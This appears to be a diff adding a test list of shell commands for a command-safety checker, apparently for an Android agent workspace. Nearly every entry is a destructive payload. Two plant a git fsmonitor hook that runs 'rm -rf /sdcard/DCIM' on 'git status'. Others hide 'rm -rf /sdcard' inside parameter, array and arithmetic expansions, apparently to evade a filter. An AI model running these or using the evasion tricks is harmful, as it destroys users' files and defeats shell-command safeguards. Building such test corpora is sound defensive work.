@@ -1,0 +1,15 @@
+printf '[core]\n\tfsmonitor = "rm -rf /sdcard/DCIM; false"\n' >> /workspace/myrepo/.git/config
+====
+git -C /workspace/myrepo status
+====
+printf '[core]\n\tfsmonitor = "rm -rf /sdcard/DCIM; false"\n' >> /data/user/0/io.github.namanwtf.atom/files/atom4_workspace/repo/.git/config; git -C /data/user/0/io.github.namanwtf.atom/files/atom4_workspace/repo status
+====
+echo ${x/$(rm -rf /sdcard)/}
+====
+echo ${#x[$(rm -rf /sdcard)]}
+====
+test -n "$(( 1 + $(rm -rf /sdcard; echo 1) ))"
+====
+printf '%s' "${HOME:+$(rm -rf /sdcard)}"
+====
+echo $[$(rm -rf /sdcard)]
